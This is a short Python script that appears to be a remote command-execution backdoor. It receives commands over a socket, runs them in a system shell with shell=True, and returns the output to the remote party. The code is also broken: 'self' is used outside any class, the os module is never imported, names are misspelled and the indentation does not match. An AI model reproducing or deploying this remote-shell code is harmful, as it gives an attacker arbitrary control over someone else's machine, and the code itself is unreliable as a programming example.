import subprocess 
from config.settings import HOST, PORT, BUFFEER_SIZE
from server import Server

def listen():
  server = Server(HOST, PORT)
  server.sever()
  while True:
    try:
        self.data = self.socket.recv(1024).decode().strip()
        if self.data == "/exit":
          return
        else:
          self.cmd(self.socket, self.data)
      except Exception as e:
        self.socket.send(f"[-] error {e}")
def cmd(self, server, data):
  try:
    if data.startwith("cd "):
      os.chdir(data [3:].strip())
      return
    p = subprocess.Popen(
      data,
      shell=True,
      stdin=subprocess.PIPE,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE
    )
    server.send(
      p.stdout.read() + p.stderr.read() + b"\n"
    )
  except Exception as e:
    self.socket.send(f"[-] error {e}")
    return
